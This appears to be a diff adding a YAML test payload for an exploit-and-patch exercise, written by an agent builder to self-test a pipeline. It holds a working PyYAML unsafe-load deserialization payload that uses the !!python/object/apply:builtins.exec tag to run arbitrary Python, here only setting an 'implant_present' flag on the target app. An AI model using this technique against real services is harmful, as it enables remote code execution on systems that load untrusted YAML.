@@ -1,0 +1,22 @@
+# FALLBACK TEST PAYLOAD — written by the investigating-agent builder, for
+# self-testing agent.py's pipeline ONLY, in case service/payloads/ was not
+# yet populated by the other builder's work. NOT the team's official
+# exploit artifact. If service/payloads/*.yaml exists, agent.py prefers
+# that instead (see find_payload_path in agent.py) and this file is unused.
+#
+# Exploits the same real PyYAML yaml.load() arbitrary-code-execution class
+# as the real payload: the !!python/object/apply: tag lets attacker-
+# controlled YAML invoke any importable callable. Here it sets
+# STATE["implant_present"] = True directly on app.py's __main__ module,
+# which flips back to False the instant /_debug/patch swaps in
+# yaml.safe_load (safe_load refuses this tag entirely, so patched targets
+# are immune).
+
+!!python/object/apply:builtins.exec
+args:
+  - |
+    import sys
+    _m = sys.modules.get('__main__')
+    if _m is not None:
+        _m.STATE['implant_present'] = True
+        _m.STATE['implant_marker'] = 'fallback-self-test-implant'
